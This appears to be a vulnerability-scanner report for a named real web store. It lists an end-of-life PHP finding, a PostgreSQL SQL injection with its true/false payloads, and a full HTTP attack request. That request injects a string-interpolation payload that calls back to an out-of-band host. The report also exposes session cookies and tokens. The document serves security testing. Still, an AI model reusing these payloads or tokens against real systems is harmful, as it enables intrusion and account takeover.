details.Impact: An EOL version of PHP is not receiving any security updates from   the vendor. Unfixed security vulnerabilities might be leveraged by an attacker to compromise the   security of this host.
details.Detection: Checks if an EOL version is present on the target host.
details.Technical Details:
::

    The "PHP" version on the remote host has reached the end of life.
    
    CPE:               cpe:/a:php:php:7.4.33
    Installed version: 7.4.33

    EOL date:          2022-11-28

details.Technical Details:
The SQL Injection flaw was identified by injecting multiple SQL statements designed to return different
application responses. This test attempts to identify the backend platform by injecting SQL statements
that will only successfully execute on a specific database or platform, in this case; "Postgress Database Server".

**Detection Payloads**

The following payload evaluates to *True* when executed by the database server::           

            57190FVLgJ'::char(5)::integer--

Conversely, the following payload evaluates to *False*::

            57190FVLgJ'::char(6)::integer--


By sampling the applications response under True/False injections, AppCheck identified a string that is 
returned when the statement is *True* but is never returned when the statement is *False*. 

**String Matching:**

The following string is returned when a SQL statement is injected that evaluates to True::

    Nisar","first_name":"Faisal","avatar_shape":"circle"},"highlightedTitle":[{"type":"plain","text":"Field

details.Generic SQL Injection Detection:
The SQL Injection flaw was identified by injecting SQL statements designed to return different web server
responses:

    *   15 requests were submitted containing payloads that evaluate to true or return the original
        value when executed by the SQL server.

    *   15 requests were submitted that evaluate to false (or raise an error) when executed by the SQL server.


An SQL injection vulnerability was determined by the ability to control the presence of the following string
within the response::

    Nisar","first_name":"Faisal","avatar_shape":"circle"},"highlightedTitle":[{"type":"plain","text":"Field


**Payload Examples:**

**Positive Injection:**    [[code:57190FVLgJ'::char(4)::integer--]]

**Negative Injection:**    [[code:57190FVLgJ'::char(9)::integer--]]

details.Attack Request:
::

    POST /accounts/contact/contact_us/ HTTP/1.1
    Content-Length: 279
    Host: webstore.go.gbgplc.com
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Connection: close
    Cookie: sessionid=kq70azidxvc2cglydeaw5012h28y4mv9; visid_incap_2840452=8h1WFagaSkeUpwL5jgIEjd6u2WYAAAAAQkIPAAAAAAAlyBW9p7SUmrc24hx5iwJS; csrftoken=HFigaCnkpESjEfYz5l4VcC8gaIgUmWuW; nlbi_2840452=aYGqICfX+hzojMOYRfr/2gAAAADkGNkLA5HQc+F20bC5mwn3; messages=; incap_ses_1081_2840452=yTkzOIp8Ak2o0VO36HsADy+v2WYAAAAAc0IPNFAhRZnAGBG4w0pHkQ==
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Referer: https://webstore.go.gbgplc.com/accounts/contact/contact_us/
    Accept-Encoding: gzip, identity
    
    csrfmiddlewaretoken=xrPK1Oum4Mru7qmVkBbk2Ctr3alNitxy4WXQ1gHwjg9DBvakfM5544rx3IrxufRk&contact_name=6be6412b02c84f37%40ptst.io&contact_company=2021&contact_email=6be6412b02c84f37%40ptst.io&content=%0A%24%7Burl%3AUTF-8%3Ahttp%3A//SENTINELc84460e8acf24136650a33d305a596b7.ptst.io/%7D
details.Technical Details:
A request was submitted with the payload [[code:${url:UTF-8:http://SENTINELc84460e8acf24136650a33d305a596b7.ptst.io/}]] in payload.content.

This uses the 'url' interpolator to cause vulnerable systems to send a HTTP request to the AppCheck Sentinel Server. An Out-of-Band HTTP connection to Sentinel was then observed.


**Affected Parameters**

::

    payload.content
details.Sentinel Detection Information:
A payload containing a specific token was submitted to the target system in order to form a unique hostname that points to the AppCheck Sentinel System. A **HTTP** connection to the unique hostname was then observed from the IP address **40.94.25.193**.

The HTTP Request received by AppCheck was as follows:


::

    GET /user_agent_analysis HTTP/1.1
    accept-language: en-US,en;q=0.9
    accept-encoding: gzip, deflate
    connection: keep-alive
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.141 Safari/537.36
    host: sentinelc84460e8acf24136650a33d305a596b7.ptst.io
    referer: http://sentinelc84460e8acf24136650a33d305a596b7.ptst.io/%7D
    upgrade-insecure-requests: 1
    


The attack was submitted at **UTC - 2024/09/05, 13:16:53** and the Out-of-Band event was detected at: **UTC - 2024/09/05, 13:18:24**
